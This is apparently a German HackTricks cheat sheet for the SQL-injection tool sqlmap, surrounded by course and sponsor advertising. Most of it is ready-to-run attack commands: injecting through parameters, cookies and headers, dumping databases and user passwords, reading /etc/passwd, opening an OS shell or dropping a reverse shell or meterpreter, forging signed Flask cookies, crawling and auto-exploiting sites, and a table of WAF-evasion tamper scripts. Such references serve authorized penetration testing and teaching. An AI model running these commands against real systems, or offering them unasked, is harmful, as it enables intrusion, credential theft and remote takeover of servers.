# SQLMap - Spickzettel

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Sofort verf√ºgbare Einrichtung f√ºr Schwachstellenbewertung & Penetrationstests**. F√ºhren Sie einen vollst√§ndigen Pentest von √ºberall aus mit 20+ Tools & Funktionen durch, die von der Aufkl√§rung bis zum Bericht reichen. Wir ersetzen keine Pentester - wir entwickeln benutzerdefinierte Tools, Erkennungs- & Exploit-Module, um ihnen etwas Zeit zur√ºckzugeben, um tiefer zu graben, Shells zu √∂ffnen und Spa√ü zu haben.

{% embed url="https://pentest-tools.com/" %}

## Grundlegende Argumente f√ºr SQLmap

### Generisch
```bash
-u "<URL>"
-p "<PARAM TO TEST>"
--user-agent=SQLMAP
--random-agent
--threads=10
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>"
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=http://127.0.0.1:8080
--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
```
### Informationen abrufen

#### Intern
```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
--privileges #Get privileges
```
#### Datenbankdaten
```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```
## Injektionsort

### Aus Burp/ZAP-Aufzeichnung

Erfassen Sie die Anfrage und erstellen Sie eine req.txt-Datei
```bash
sqlmap -r req.txt --current-user
```
### GET-Anforderungsinjektion
```bash
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
### POST-Anfrage-Injektion
```bash
sqlmap -u "http://example.com" --data "username=*&password=*"
```
### Injektionen in Headern und anderen HTTP-Methoden
```bash
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```
### Geben Sie den String an, wenn die Injektion erfolgreich ist
```bash
--string="string_showed_when_TRUE"
```
### Eval

**Sqlmap** erm√∂glicht die Verwendung von `-e` oder `--eval`, um jeden Payload mit einem Python-Oneliner zu verarbeiten, bevor er gesendet wird. Dies macht es sehr einfach und schnell, den Payload auf benutzerdefinierte Weise zu verarbeiten, bevor er gesendet wird. Im folgenden Beispiel wird die **Flask-Cookie-Session** **von Flask mit dem bekannten Geheimnis signiert, bevor sie gesendet wird**:
```bash
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
```
### Shell

Die `--os-shell` Option startet eine interaktive Shell auf dem Betriebssystem des Zielservers. Dies erm√∂glicht es dem Benutzer, Befehle direkt auf dem Zielsystem auszuf√ºhren.
```bash
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```
### Datei lesen

--- 

#### Beschreibung

Die `--file-read`-Funktion erm√∂glicht es, Dateien vom Dateisystem des DBMS zu lesen.

#### Syntax

```bash
sqlmap -u <URL> --file-read=<FILEPATH>
```

#### Beispiel

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --file-read=/etc/passwd
```
```bash
--file-read=/etc/passwd
```
### Eine Website mit SQLmap durchsuchen und automatisch ausnutzen
```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```
### Second Order Injection

### Zweite Ordnung Injektion
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```
[**Lesen Sie diesen Beitrag**](second-order-injection-sqlmap.md)**√ºber die Durchf√ºhrung einfacher und komplexer Second-Order-Injections mit sqlmap.**

## Anpassen der Injektion

### Setzen Sie ein Suffix
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```
### Pr√§fix
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
```
### Hilfe bei der Suche nach Boolean-Injektion
```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
```
### Tamper

Denken Sie daran, dass **Sie Ihren eigenen Tamper in Python erstellen k√∂nnen** und es ist sehr einfach. Ein Tamper-Beispiel finden Sie auf der [Second Order Injection-Seite hier](second-order-injection-sqlmap.md).
```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
```
| Tamper                       | Beschreibung                                                                                                                        |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| apostrophemask.py            | Ersetzt das Apostroph-Zeichen durch sein UTF-8 Vollbreiten-Gegenst√ºck                                                               |
| apostrophenullencode.py      | Ersetzt das Apostroph-Zeichen durch sein illegales doppeltes Unicode-Gegenst√ºck                                                    |
| appendnullbyte.py            | H√§ngt ein codiertes NULL-Byte-Zeichen am Ende des Payloads an                                                                      |
| base64encode.py              | Base64 alle Zeichen in einem gegebenen Payload                                                                                     |
| between.py                   | Ersetzt den Gr√∂√üer-als-Operator ('>') durch 'NICHT ZWISCHEN 0 UND #'                                                               |
| bluecoat.py                  | Ersetzt das Leerzeichen nach dem SQL-Statement durch ein g√ºltiges zuf√§lliges Leerzeichen. Ersetzt anschlie√üend das Zeichen = durch den LIKE-Operator |
| chardoubleencode.py          | Verdoppelt die URL-Codierung aller Zeichen in einem gegebenen Payload (nicht bereits codierte Verarbeitung)                        |
| commalesslimit.py            | Ersetzt Vorkommnisse wie 'LIMIT M, N' durch 'LIMIT N OFFSET M'                                                                      |
| commalessmid.py              | Ersetzt Vorkommnisse wie 'MID(A, B, C)' durch 'MID(A FROM B FOR C)'                                                                |
| concat2concatws.py           | Ersetzt Vorkommnisse wie 'CONCAT(A, B)' durch 'CONCAT\_WS(MID(CHAR(0), 0, 0), A, B)'                                               |
| charencode.py                | URL-codiert alle Zeichen in einem gegebenen Payload (nicht bereits codierte Verarbeitung)                                           |
| charunicodeencode.py         | Unicode-URL-codiert nicht codierte Zeichen in einem gegebenen Payload (nicht bereits codierte Verarbeitung). "%u0022"               |
| charunicodeescape.py         | Unicode-URL-codiert nicht codierte Zeichen in einem gegebenen Payload (nicht bereits codierte Verarbeitung). "\u0022"               |
| equaltolike.py               | Ersetzt alle Vorkommnisse des Operators gleich ('=') durch den Operator 'LIKE'                                                     |
| escapequotes.py              | Schr√§gstrich entkommt Anf√ºhrungszeichen (' und ")                                                                                   |
| greatest.py                  | Ersetzt den Gr√∂√üer-als-Operator ('>') durch das 'GREATEST'-Gegenst√ºck                                                               |
| halfversionedmorekeywords.py | F√ºgt vor jedem Schl√ºsselwort einen versionierten MySQL-Kommentar hinzu                                                              |
| ifnull2ifisnull.py           | Ersetzt Vorkommnisse wie 'IFNULL(A, B)' durch 'IF(ISNULL(A), B, A)'                                                                 |
| modsecurityversioned.py      | Umarmt die vollst√§ndige Abfrage mit einem versionierten Kommentar                                                                    |
| modsecurityzeroversioned.py  | Umarmt die vollst√§ndige Abfrage mit einem null-versionierten Kommentar                                                               |
| multiplespaces.py            | F√ºgt mehrere Leerzeichen um SQL-Schl√ºsselw√∂rter hinzu                                                                                |
| nonrecursivereplacement.py   | Ersetzt vordefinierte SQL-Schl√ºsselw√∂rter durch geeignete Darstellungen f√ºr den Ersatz (z. B. .replace("SELECT", "")) Filter        |
| percentage.py                | F√ºgt jedem Zeichen ein Prozentzeichen ('%') voran                                                                                   |
| overlongutf8.py              | Konvertiert alle Zeichen in einem gegebenen Payload (nicht bereits codierte Verarbeitung)                                          |
| randomcase.py                | Ersetzt jedes Schl√ºsselwortzeichen durch einen zuf√§lligen Gro√ü-/Kleinschreibungswert                                               |
| randomcomments.py            | F√ºgt zuf√§llige Kommentare zu SQL-Schl√ºsselw√∂rtern hinzu                                                                              |
| securesphere.py              | H√§ngt einen speziell erstellten String an                                                                                           |
| sp\_password.py              | H√§ngt 'sp\_password' an das Ende des Payloads zur automatischen Verschleierung in den DBMS-Protokollen                              |
| space2comment.py             | Ersetzt Leerzeichen (' ') durch Kommentare                                                                                          |
| space2dash.py                | Ersetzt Leerzeichen (' ') durch einen Strichkommentar ('--') gefolgt von einer zuf√§lligen Zeichenfolge und einem Zeilenumbruch ('\n') |
| space2hash.py                | Ersetzt Leerzeichen (' ') durch ein Rautenzeichen ('#') gefolgt von einer zuf√§lligen Zeichenfolge und einem Zeilenumbruch ('\n')      |
| space2morehash.py            | Ersetzt Leerzeichen (' ') durch ein Rautenzeichen ('#') gefolgt von einer zuf√§lligen Zeichenfolge und einem Zeilenumbruch ('\n')      |
| space2mssqlblank.py          | Ersetzt Leerzeichen (' ') durch ein zuf√§lliges Leerzeichen aus einem g√ºltigen Satz alternativer Zeichen                              |
| space2mssqlhash.py           | Ersetzt Leerzeichen (' ') durch ein Rautenzeichen ('#') gefolgt von einem Zeilenumbruch ('\n')                                      |
| space2mysqlblank.py          | Ersetzt Leerzeichen (' ') durch ein zuf√§lliges Leerzeichen aus einem g√ºltigen Satz alternativer Zeichen                              |
| space2mysqldash.py           | Ersetzt Leerzeichen (' ') durch einen Strichkommentar ('--') gefolgt von einem Zeilenumbruch ('\n')                                  |
| space2plus.py                | Ersetzt Leerzeichen (' ') durch Plus ('+')                                                                                         |
| space2randomblank.py         | Ersetzt Leerzeichen (' ') durch ein zuf√§lliges Leerzeichen aus einem g√ºltigen Satz alternativer Zeichen                              |
| symboliclogical.py           | Ersetzt die logischen Operatoren AND und OR durch ihre symbolischen Gegenst√ºcke (&& und                                              |
| unionalltounion.py           | Ersetzt UNION ALL SELECT durch UNION SELECT                                                                                        |
| unmagicquotes.py             | Ersetzt das Anf√ºhrungszeichen (') durch eine Multi-Byte-Kombination %bf%27 zusammen mit einem generischen Kommentar am Ende (um es zu aktivieren) |
| uppercase.py                 | Ersetzt jedes Schl√ºsselwortzeichen durch den Gro√übuchstabenwert 'INSERT'                                                           |
| varnish.py                   | F√ºgt einen HTTP-Header 'X-originating-IP' hinzu                                                                                     |
| versionedkeywords.py         | Umschlie√üt jedes nicht-funktionale Schl√ºsselwort mit einem versionierten MySQL-Kommentar                                            |
| versionedmorekeywords.py     | Umschlie√üt jedes Schl√ºsselwort mit einem versionierten MySQL-Kommentar                                                             |
| xforwardedfor.py             | F√ºgt einen gef√§lschten HTTP-Header 'X-Forwarded-For' hinzu                                                                         |

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Sofort einsatzbereite Einrichtung f√ºr Schwachstellenbewertung & Penetrationstests**. F√ºhren Sie einen vollst√§ndigen Pentest von √ºberall aus mit 20+ Tools & Funktionen durch, die von der Aufkl√§rung bis zum Bericht reichen. Wir ersetzen keine Pentester - wir entwickeln benutzerdefinierte Tools, Erkennungs- & Exploit-Module, um ihnen etwas Zeit zu geben, tiefer zu graben, Shells zu √∂ffnen und Spa√ü zu haben.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen** m√∂chten oder **HackTricks als PDF herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
